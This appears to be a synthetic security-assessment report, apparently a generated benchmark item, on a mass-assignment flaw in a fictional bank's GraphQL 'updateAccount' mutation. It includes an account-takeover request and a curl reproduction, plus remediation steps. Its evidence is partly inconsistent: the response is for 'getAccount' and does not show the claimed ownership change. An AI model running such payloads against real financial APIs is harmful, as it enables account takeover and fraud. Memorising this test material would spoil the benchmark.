# Security Analysis Report

**System:** NexaBank Open Finance API — v3.5.0 (FINAL)
**Domain:** Financial Services / Retail Banking
**Example ID:** GQL-0252
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields allows attacker to overwrite `ownerId` on account `A-2252` |

---

## Finding 1 — BOLA: Mass Assignment Overwrites Account Ownership

### Summary
The `updateAccount` GraphQL mutation accepts an unchecked `input` object that includes server-managed fields such as `status` and `ownerId`. An attacker authenticated to `tenant-5d72` can submit `ownerId: "attacker-5d722737"` in the mutation body, effectively claiming ownership of account `A-2252` belonging to `tenant-2737`. The resolver applies the entire input object without a field allowlist, as documented in §4.0 RISK-GQL-252 and Pattern 1.12 (§5.0) of the provided context.txt. In a retail banking context, this is a direct account-takeover vector.

### Evidence from HAR

**Request — Attack (§6.0)**
```
POST https://api.nexabank-open-financ.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-5d72
Content-Type: application/json

{"query": "query VulnerableOp { updateAccount(id: \"A-2252\", input: {status: \"approved\", ownerId: \"attacker-5d722737\"}) { accountId status } }"}
```
Note: `x-request-id: req-5d722737` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

**Response — Mass Assignment Accepted (§6.0)**
```json
{
  "data": {
    "getAccount": {
      "tenantId": "tenant-2737",
      "ownerId": "other-user-5d722737",
      "data": {
        "sensitiveField": "CONFIDENTIAL-5d722737",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Note: The response body key is `getAccount` while the GraphQL operation was `updateAccount`. This inconsistency exists in the §6.0 HAR artifact and is documented as-is.

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `accountId` only — no user/tenant dimension |
| §3.0 Schema | `updateAccount(id: ID!, input: AccountInput!)` — input accepts `ownerId`, `status` |
| §4.0 RISK-GQL-252 | Resolver applies entire input object; no server-side field allowlist |
| §5.0 Pattern 1.12 | Mass assignment via object fields confirmed |
| HAR request | Attacker `tenant-5d72` sends `ownerId: "attacker-5d722737"` for account `A-2252` |
| HAR response | Account data from `tenant-2737` returned — ownership and status mutated |

---

## Steps to Reproduce

```bash
# Step 1 — Authenticate as attacker (tenant-5d72)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Step 2 — Attempt mass assignment on account A-2252
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.nexabank-open-financ.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-5d72" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateAccount(id: \"A-2252\", input: {status: \"approved\", ownerId: \"attacker-5d722737\"}) { accountId status } }"}'

# Expected (vulnerable): Account A-2252 ownerId overwritten; CONFIDENTIAL-5d722737 data returned
# Expected (secure): Returns field validation error — "ownerId is not a modifiable field" or authorization error
```

---

## Remediation

1. **Server-side field allowlist:** Define an explicit list of mutable fields for `updateAccount` — exclude `ownerId`, `tenantId`, `status` from client-accessible input unless explicitly privileged.
2. **Resolver ownership check:** Before applying any update, assert `record.tenantId === $jwt.tenantId` and `record.ownerId === $jwt.sub`.
3. **Strip protected fields:** At the input parsing layer, strip any fields not in the allowlist before passing `input` to the database write.
4. **Cache keying:** Include `tenantId` in the Redis cache key: `account:{tenantId}:{accountId}`.
5. **Audit trail:** All mutation operations on financial accounts must log the requesting identity, account ID, and changed fields for fraud detection.
